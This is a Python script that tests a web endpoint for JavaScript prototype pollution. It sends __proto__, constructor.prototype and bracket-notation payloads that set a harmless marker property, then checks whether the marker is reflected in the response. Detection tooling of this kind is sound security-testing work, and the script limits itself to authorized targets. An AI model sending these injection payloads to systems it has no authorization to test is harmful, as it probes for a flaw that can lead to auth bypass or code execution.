#!/usr/bin/env python3
"""
Prototype Pollution Detector
-------------------------------
Tests a JSON-accepting endpoint (typically Node.js/JavaScript
backends) for Prototype Pollution — a vulnerability class specific to
JS's object model, where a naive recursive merge/clone/assign
function lets an attacker inject the `__proto__` key to add
properties to EVERY object in the application (since all objects
inherit from `Object.prototype` unless explicitly isolated). This can
escalate to auth bypass, RCE (via gadget chains in some libraries),
or DoS depending on how the polluted property gets used downstream.

Sends payloads that attempt to set a distinctive marker property via
`__proto__`, `constructor.prototype`, and array-bracket-notation
variants (`[__proto__][x]=y`), then checks the response for any
reflection of that marker in a context suggesting it affected global
object behavior.

Intended for use ONLY against systems you own or are explicitly
authorized to test.

Usage:
    python prototype_pollution_detector.py --url https://target.com/api/merge
"""

import argparse
import json
import sys
import uuid

import requests

MARKER_KEY = "pp_test_marker"


def build_json_payloads(marker_value):
    return [
        ("__proto__ direct", {"__proto__": {MARKER_KEY: marker_value}}),
        ("__proto__ nested", {"a": {"__proto__": {MARKER_KEY: marker_value}}}),
        ("constructor.prototype", {"constructor": {"prototype": {MARKER_KEY: marker_value}}}),
    ]


def build_query_payloads(marker_value):
    # Common for endpoints that merge query-string params into an options object
    return [
        ("query __proto__", {"__proto__[" + MARKER_KEY + "]": marker_value}),
        ("query bracket", {f"[__proto__][{MARKER_KEY}]": marker_value}),
    ]


def send_and_check(session, url, method, data, as_json, timeout, marker_value):
    try:
        if as_json:
            resp = session.request(method, url, json=data, timeout=timeout)
        else:
            resp = session.request(method, url, params=data, timeout=timeout)
    except requests.RequestException as e:
        return None, str(e)

    body = resp.text or ""
    reflected = marker_value in body
    return resp, ("reflected" if reflected else None)


def main():
    parser = argparse.ArgumentParser(description="Test a JSON endpoint for JavaScript Prototype Pollution.")
    parser.add_argument("--url", required=True, help="Target endpoint that merges/clones a submitted object")
    parser.add_argument("--method", default="POST", choices=["GET", "POST", "PUT", "PATCH"], help="HTTP method (default: POST)")
    parser.add_argument("--as-query", action="store_true", help="Send payloads as query-string params instead of a JSON body")
    parser.add_argument("--timeout", type=float, default=10.0, help="Request timeout in seconds")
    args = parser.parse_args()

    marker_value = f"pp_confirmed_{uuid.uuid4().hex[:8]}"
    payloads = build_query_payloads(marker_value) if args.as_query else build_json_payloads(marker_value)

    print(f"[*] Target: {args.url}")
    print(f"[*] Marker value: {marker_value}")
    print(f"[*] Testing {len(payloads)} payload variant(s)")
    print("-" * 60)

    any_reflected = False
    with requests.Session() as session:
        for label, payload in payloads:
            resp, signal = send_and_check(session, args.url, args.method, payload, not args.as_query, args.timeout, marker_value)

            if resp is None:
                print(f"[ERR ] {label:<28} {signal}")
                continue

            if signal == "reflected":
                any_reflected = True
                print(f"[!!! POSSIBLE POLLUTION] {label} — marker reflected in response (status={resp.status_code})")
            else:
                print(f"[ -- ] {label:<28} status={resp.status_code}, no marker reflection")

    print("-" * 60)
    if any_reflected:
        print("[!] Marker value reflected — this suggests the payload reached a merge/clone")
        print("    operation, but reflection alone doesn't prove prototype pollution occurred.")
        print("    Confirm by checking whether the polluted property persists across UNRELATED")
        print("    requests/objects (the defining trait of real prototype pollution: a plain")
        print("    object created elsewhere in the app now also has the injected property).")
        print("    This typically requires manual testing in a browser console or a second")
        print("    follow-up request to an unrelated endpoint that would reveal the pollution.")
    else:
        print("[*] No marker reflection detected. Note this only tests common merge-based")
        print("    injection points — prototype pollution can also occur via URL parsing,")
        print("    query-string libraries, or deep-clone utilities not covered by this test.")


if __name__ == "__main__":
    main()
